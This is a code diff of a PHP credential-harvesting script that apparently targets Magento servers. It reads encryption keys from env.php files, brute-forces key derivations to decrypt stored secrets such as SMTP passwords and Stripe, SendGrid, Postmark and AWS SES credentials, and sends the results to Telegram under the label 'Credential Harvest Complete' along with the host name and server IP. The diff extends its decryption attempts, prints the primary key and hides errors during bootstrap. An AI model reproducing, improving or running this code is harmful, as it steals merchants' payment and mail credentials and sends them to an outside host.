@@ -112,6 +112,11 @@ foreach (glob($dir . '/env*.php*') as $f) {
 $keys = array_unique($keys);
 echo "Loaded " . count($keys) . " encryption keys.\n";
 
+// Debug: Show the key being used
+if (count($keys) > 0) {
+    echo "Primary key: " . $keys[0] . "\n";
+}
+
 // ============================================
 // DECRYPT FUNCTIONS
 // ============================================
@@ -119,7 +124,10 @@ if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBO
 if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);
 
 function standalone_sodium_decrypt($encrypted_full, $key) {
-    if (!function_exists('sodium_crypto_secretbox_open')) return false;
+    if (!function_exists('sodium_crypto_secretbox_open')) {
+        // Sodium not available - return original encrypted value for manual decryption
+        return $encrypted_full;
+    }
     $parts = explode(':', $encrypted_full);
     if (count($parts) < 3) return false;
     $payload = base64_decode(end($parts));
@@ -130,41 +138,88 @@ function standalone_sodium_decrypt($encrypted_full, $key) {
     // Build all possible key candidates
     $candidates = [];
     
-    // If key is 32 hex chars (16 bytes raw)
+    // If key is 32 alphanumeric chars (not necessarily hex)
+    if (strlen($key) == 32) {
+        // Try as raw string first (common in newer Magento)
+        if (function_exists('hash_hkdf')) {
+            $candidates[] = hash_hkdf('sha256', $key, 32, '', '');
+        }
+        
+        // Manual HKDF for the raw string
+        $prk = hash_hmac('sha256', $key, '', true);
+        $t = '';
+        $okm = '';
+        for ($i = 1; strlen($okm) < 32; $i++) {
+            $t = hash_hmac('sha256', $t . chr($i), $prk, true);
+            $okm .= $t;
+        }
+        $candidates[] = substr($okm, 0, 32);
+        
+        // SHA256 of the key
+        $candidates[] = hash('sha256', $key, true);
+    }
+    
+    // If key is 32 hex chars (16 bytes raw) - additional methods
     if (strlen($key) == 32 && ctype_xdigit($key)) {
         $hex_bytes = hex2bin($key);
         
         // Method 1: HKDF with empty salt/info (Magento 2.4.0-2.4.3)
         if (function_exists('hash_hkdf')) {
             $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', '');
+            $candidates[] = hash_hkdf('sha256', $key, 32, '', ''); // Try string key too
         }
         
-        // Method 2: HKDF with salt = raw key (Magento 2.4.4+)
+        // Method 2: HKDF with different salts
         if (function_exists('hash_hkdf')) {
             $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', $key);
+            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', $hex_bytes);
         }
         
-        // Method 3: Double the key
+        // Method 3: Manual HKDF implementation (fallback for PHP < 7.1.2)
+        $prk = hash_hmac('sha256', $hex_bytes, '', true);
+        $t = '';
+        $okm = '';
+        for ($i = 1; strlen($okm) < 32; $i++) {
+            $t = hash_hmac('sha256', $t . chr($i), $prk, true);
+            $okm .= $t;
+        }
+        $candidates[] = substr($okm, 0, 32);
+        
+        // Method 4: Double the key
         $candidates[] = $hex_bytes . $hex_bytes;
         
-        // Method 4: Pad to 32 bytes
+        // Method 5: Pad to 32 bytes
         $candidates[] = str_pad($hex_bytes, 32, "\0");
         
-        // Method 5: Use raw string as key material
-        if (function_exists('hash_hkdf')) {
-            $candidates[] = hash_hkdf('sha256', $key, 32, '', '');
-        }
+        // Method 6: SHA256 hash of key
+        $candidates[] = hash('sha256', $hex_bytes, true);
+        $candidates[] = hash('sha256', $key, true);
     }
     
     // If key is 64 hex chars (32 bytes raw)
     if (strlen($key) == 64 && ctype_xdigit($key)) {
         $candidates[] = hex2bin($key);
+        if (function_exists('hash_hkdf')) {
+            $candidates[] = hash_hkdf('sha256', hex2bin($key), 32, '', '');
+        }
     }
     
-    // Standard attempts
+    // Standard attempts (try these early)
+    if (strlen($key) == 32) {
+        // Raw key as-is (for alphanumeric keys like 'exdcj8nnztn3dnmhy9jkqhjmgqyah2wl')
+        array_unshift($candidates, $key);
+    }
     $candidates[] = $key;
-    $candidates[] = md5($key);
+    $candidates[] = md5($key, true);
     $candidates[] = substr($key, 0, 32);
+    
+    // Pad key if too short
+    if (strlen($key) < 32) {
+        $candidates[] = str_pad($key, 32, "\0");
+    }
+    
+    // Remove duplicates and invalid lengths
+    $candidates = array_unique($candidates, SORT_REGULAR);
     
     foreach ($candidates as $k) {
         if (!is_string($k) || strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
@@ -187,18 +242,33 @@ function smart_decrypt($value, $keys) {
     
     // Try using Magento's native decryption first (most reliable)
     static $magento_encryptor = null;
-    if ($magento_encryptor === null) {
+    static $bootstrap_attempted = false;
+    
+    if (!$bootstrap_attempted) {
+        $bootstrap_attempted = true;
         try {
-            // Try to load Magento bootstrap
-            $bootstrap_path = dirname(findEnvPhp()) . '/../../app/bootstrap.php';
-            if (file_exists($bootstrap_path)) {
-                require_once $bootstrap_path;
-                $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $_SERVER);
-                $obj = $bootstrap->getObjectManager();
-                $magento_encryptor = $obj->get('\Magento\Framework\Encryption\EncryptorInterface');
+            // Check PHP version first
+            if (version_compare(PHP_VERSION, '7.4.0', '>=')) {
+                // Try to load Magento bootstrap
+                $bootstrap_path = dirname(findEnvPhp()) . '/../../app/bootstrap.php';
+                if (file_exists($bootstrap_path)) {
+                    // Suppress all errors during bootstrap
+                    $old_error = error_reporting(0);
+                    require_once $bootstrap_path;
+                    $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $_SERVER);
+                    $obj = $bootstrap->getObjectManager();
+                    $magento_encryptor = $obj->get('\Magento\Framework\Encryption\EncryptorInterface');
+                    error_reporting($old_error);
+                }
+            } else {
+                // PHP too old, skip Magento bootstrap
+                $magento_encryptor = false;
             }
         } catch (Exception $e) {
             // Magento bootstrap failed, use standalone methods
+            $magento_encryptor = false;
+        } catch (Error $e) {
+            // PHP error (like composer check), use standalone methods
             $magento_encryptor = false;
         }
     }
@@ -509,7 +579,18 @@ if (!empty($aws_ses)) {
             $output .= sprintf("%-20s: %s\n", "Username", $smtp_config['username']);
         }
         if ($smtp_config['password']) {
-            $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
+            // Check if password is still encrypted (starts with version:cipher format)
+            if (strpos($smtp_config['password'], '0:3:') === 0 || strpos($smtp_config['password'], '0:2:') === 0) {
+                $output .= sprintf("%-20s: [ENCRYPTED]\n", "Password");
+                $output .= sprintf("%-20s  %s\n", "", "Value: " . $smtp_config['password']);
+                if (!function_exists('sodium_crypto_secretbox_open')) {
+                    $output .= sprintf("%-20s  %s\n", "", "(Server lacks Sodium - decrypt manually)");
+                } else {
+                    $output .= sprintf("%-20s  %s\n", "", "(Encrypted with different key - check old env.php)");
+                }
+            } else {
+                $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
+            }
         }
         if ($smtp_config['from_email']) {
             $output .= sprintf("%-20s: %s\n", "From Email", $smtp_config['from_email']);
@@ -588,7 +669,11 @@ if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp &&
     echo "Sent to Telegram (no credentials found).\n";
 } else {
     // Credentials found - send file
-    send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nIP: $server_ip\nFound: " . count($results) . " entries", $outFile);
+    $note = "";
+    if (!function_exists('sodium_crypto_secretbox_open')) {
+        $note = "\n\n⚠️ Note: Server lacks Sodium extension. Some encrypted values shown as-is.";
+    }
+    send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nIP: $server_ip\nFound: " . count($results) . " entries" . $note, $outFile);
     echo "\nSaved to: $outFile\n";
     echo "Sent to Telegram!\n";
 }
